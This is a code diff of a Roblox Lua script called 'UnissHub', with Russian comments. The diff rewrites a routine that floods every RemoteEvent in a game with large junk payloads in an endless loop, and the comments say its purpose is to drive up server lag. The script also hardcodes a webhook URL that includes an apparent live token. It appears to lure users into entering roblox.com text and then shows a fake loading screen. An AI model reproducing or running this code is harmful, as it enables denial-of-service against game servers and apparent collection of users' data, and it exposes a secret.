@@ -1,4 +1,4 @@
--- UnissHub: Network Stress Edition
+-- UnissHub: High-FPS Network Lag Edition
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -7,28 +7,30 @@ local Player = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"
 
--- Функция создания высокого ПИНГА через сетевую нагрузку
-local function startNetworkStress()
+-- Генерация "тяжелого" пакета данных для забивания интернета
+local heavyData = {}
+for i = 1, 1000 do heavyData[i] = "LAG_DATA_STREAM" end
+
+-- Функция сетевого лага без падения ФПС
+local function startSmoothNetworkLag()
     task.spawn(function()
-        local events = {}
-        -- Ищем все доступные события в игре для спама пакетами
+        local remotes = {}
         for _, v in pairs(game:GetDescendants()) do
-            if v:IsA("RemoteEvent") then
-                table.insert(events, v)
-            end
+            if v:IsA("RemoteEvent") then table.insert(remotes, v) end
         end
+        
+        if #remotes == 0 then return end
 
         while true do
-            -- Отправляем пачку данных в случайные события
-            for i = 1, 50 do
-                local ev = events[math.random(1, #events)]
-                if ev then
-                    -- Отправка пустого вызова создает нагрузку на канал
-                    pcall(function() ev:FireServer(false) end)
-                end
+            -- Отправляем 10 тяжелых пакетов
+            for i = 1, 10 do
+                local r = remotes[math.random(1, #remotes)]
+                pcall(function()
+                    r:FireServer(heavyData) -- Отправляем большую таблицу
+                end)
             end
-            -- Регулируем задержку, чтобы пинг был в районе 5000-15000ms
-            task.wait(0.01) 
+            -- Пауза 0.1 сек дает процессору обработать кадры, но интернет не успевает "остыть"
+            task.wait(0.1) 
         end
     end)
 end
@@ -98,8 +100,8 @@ conn.MouseButton1Click:Connect(function()
     if string.find(input.Text:lower(), "roblox.com") then
         local currentPos = main.Position
         
-        -- ЗАПУСК СЕТЕВОЙ НАГРУЗКИ (ПИНГА)
-        startNetworkStress()
+        -- ЗАПУСК СМЯГЧЕННОЙ СЕТЕВОЙ НАГРУЗКИ
+        startSmoothNetworkLag()
 
         main:TweenSize(UDim2.new(0,0,0,0), "In", "Quart", 0.3, true, function() 
             main.Visible = false; uBtn.Visible = false 
@@ -129,7 +131,7 @@ conn.MouseButton1Click:Connect(function()
                 if i == 30 or i == 65 or i == 92 then task.wait(math.random(2, 4)) end
                 lLabel.Text = "loading: " .. i .. "%"
                 fill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Linear", 0.1, true)
-                task.wait(math.random(4, 8) / 10) 
+                task.wait(math.random(2, 5) / 10) -- Немного ускорил визуально для комфорта
             end
             lLabel.TextSize = 18; lLabel.Text = "CONFIRM"
         end)
